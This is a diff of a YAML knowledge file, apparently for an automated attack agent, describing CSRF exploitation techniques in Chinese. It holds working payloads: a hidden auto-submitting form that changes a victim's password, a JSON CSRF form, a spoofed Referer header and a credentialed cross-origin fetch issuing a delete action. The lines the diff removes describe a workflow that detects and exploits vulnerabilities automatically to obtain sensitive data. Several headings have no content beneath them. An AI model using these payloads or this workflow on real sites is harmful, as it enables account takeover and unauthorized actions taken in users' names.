@@ -1,85 +1,14 @@
-name: "csrf"
-description: "csrf 攻击技术和利用方法"
-domain: "web"
-version: "1.0"
+name: csrf
+description: csrf 攻击技术和利用方法
+domain: web
+version: '1.0'
 tags:
-  - web
-  - csrf
-
-knowledge: |
-  # CSRF跨站请求伪造
-  
-  ## 1. 基础CSRF攻击
-  
-  ```html
-  <form action="http://target.com/change-password" method="POST">
-  <input type="hidden" name="password" value="hacked">
-  </form>
-  <script>document.forms[0].submit()</script>
-  ```
-  
-  ## 2. JSON CSRF
-  
-  ```html
-  <form action="http://target.com/api/update" method="POST" enctype="text/plain">
-  <input name='{"password":"hacked","ignore":"'>
-  </form>
-  <script>document.forms[0].submit()</script>
-  ```
-  
-  ## 3. SameSite绕过
-  
-  ### 顶级域名跨站
-  
-  ### POST请求利用
-  
-  ### 二级域名cookie
-  
-  ## 4. Token绕过
-  
-  ### Token泄露
-  
-  ### Token固定
-  
-  ### CORS绕过获取Token
-  
-  ## 5. Referer绕过
-  
-  ```
-  Referer: http://target.com-attacker.com
-  ```
-  
-  ## 6. CORS配置错误
-  
-  ```javascript
-  fetch('http://target.com/api', {
-    method: 'POST',
-    credentials: 'include',
-    body: JSON.stringify({action: 'delete'})
-  })
-  ```
-  
-
-workflows:
-  - name: "自动检测和利用"
-    description: "自动检测漏洞并尝试利用"
-    steps:
-      - description: "信息收集和漏洞探测"
-        expected_output: "发现潜在漏洞点"
-      - description: "漏洞验证"
-        expected_output: "确认漏洞存在"
-      - description: "漏洞利用"
-        expected_output: "成功利用漏洞"
-
-tool_preferences:
-  nmap:
-    score: 0.8
-    reason: "端口和服务扫描"
-  nuclei:
-    score: 0.9
-    reason: "漏洞扫描"
-
-examples:
-  - scenario: "发现漏洞并获取敏感信息"
-    solution: "使用工具探测 -> 验证漏洞 -> 获取数据"
-    tools_used: ["nmap", "nuclei"]
+- web
+- csrf
+knowledge: "# CSRF跨站请求伪造\n\n## 1. 基础CSRF攻击\n\n```html\n<form action=\"http://target.com/change-password\" method=\"POST\"\
+  >\n<input type=\"hidden\" name=\"password\" value=\"hacked\">\n</form>\n<script>document.forms[0].submit()</script>\n```\n\
+  \n## 2. JSON CSRF\n\n```html\n<form action=\"http://target.com/api/update\" method=\"POST\" enctype=\"text/plain\">\n<input\
+  \ name='{\"password\":\"hacked\",\"ignore\":\"'>\n</form>\n<script>document.forms[0].submit()</script>\n```\n\n## 3. SameSite绕过\n\
+  \n### 顶级域名跨站\n\n### POST请求利用\n\n### 二级域名cookie\n\n## 4. Token绕过\n\n### Token泄露\n\n### Token固定\n\n### CORS绕过获取Token\n\n##\
+  \ 5. Referer绕过\n\n```\nReferer: http://target.com-attacker.com\n```\n\n## 6. CORS配置错误\n\n```javascript\nfetch('http://target.com/api',\
+  \ {\n  method: 'POST',\n  credentials: 'include',\n  body: JSON.stringify({action: 'delete'})\n})\n```\n"
